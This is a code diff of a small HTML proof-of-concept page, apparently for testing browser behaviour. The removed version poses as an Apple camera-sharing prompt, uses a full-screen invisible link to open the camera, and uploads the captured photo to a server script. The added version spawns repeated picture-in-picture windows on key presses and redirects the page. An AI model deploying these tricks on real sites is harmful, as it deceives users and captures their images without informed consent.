@@ -1,62 +1,24 @@
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
-    input {
-        display: none;
-    }
-
-    img {
-        width: 100%;
-    }
-</style>
-
-<h1>Tap to share your camera to Apple</h1>
-
-<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
-
-<img id="img" src="">
-<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
+<h1>Hold Enter</h1>
 
 <script>
-    document.getElementById('link').onclick = () => {
+    let i = 0;
+    const pipOpen = async () => {
+        if (i > 5) return;
+        i++;
+
+        documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 400,
+        }).then(pipWindow => {
+            pipWindow.location.href = 'https://example.com';
+        });
+
         setTimeout(() => {
-            document.getElementById('fileSelect').click();
-        }, 600);
+            location.href = 'https://google.com/x';
+        }, 100);
     };
 
-    document.getElementById('fileSelect').onchange = (event) => {
-        const file = event.target.files[0];
-        if (file) {
-            const img = document.getElementById('img');
-            img.src = URL.createObjectURL(file);
-
-            const formData = new FormData();
-            formData.append('file', file);
-
-            fetch('upload.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(result => {
-                console.log('Success:', result);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
+    document.body.onkeypress = () => {
+        pipOpen();
     };
 </script>
